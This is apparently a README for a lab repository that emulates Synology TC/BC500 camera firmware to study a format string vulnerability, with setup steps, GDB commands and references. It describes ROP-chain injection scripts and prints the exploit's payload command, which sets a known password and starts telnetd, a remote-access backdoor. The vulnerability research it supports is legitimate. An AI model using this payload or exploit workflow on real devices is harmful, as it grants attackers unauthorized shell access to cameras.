# Synology TC500 Format String Bug

Analysis of a format string bug in Synology TC/BC500 IP cameras found by Baptiste Moine.


## Setup

In your shell run -

```sh
chmod +x docker.sh
docker.sh
```

Then, inside the container run -

```sh
sh /host/webd.sh
```

## GDB Debugging

For debugging the webd binary with GDB through QEMU:

1. Start the container with GDB server:
```sh
# In container
sh /host/webd.sh gdb
```

2. Connect with GDB and inject ROP chain:
```sh
# In host terminal
gdb-multiarch -x rop_simple.gdb
(gdb) target remote localhost:1234
(gdb) break *0x28a5c    # Replace with your target function/address
(gdb) continue
# When breakpoint hits:
(gdb) inject_rop        # Inject ROP chain to stack
(gdb) execute_rop       # Redirect execution to ROP chain
(gdb) continue          # Execute the ROP chain
```

### ROP Chain Injection Scripts

- **`rop_simple.gdb`** - Simple manual injection script with commands:
  - `inject_rop [offset]` - Write ROP chain to stack at SP + offset
  - `execute_rop [offset]` - Redirect execution to ROP chain  
  - `show_rop [offset]` - Display ROP chain contents

- **`rop_inject.gdb`** - Automated injection script that triggers on breakpoint

The ROP chain implements the Synology TC500 format string exploit and executes:
```bash
sh -c 'echo synodebug:synodebug|chpasswd;telnetd'
```

## References

* https://www.synacktiv.com/en/publications/exploiting-a-blind-format-string-vulnerability-in-modern-binaries-a-case-study-from

* https://www.synacktiv.com/sites/default/files/2024-10/bc500-p2o_2023_0.pdf

* https://www.hackcyom.com/2024/01/rwctf-lets-party-in-the-house-wu/

* https://archive.synology.com/download/Firmware/Camera/TC500


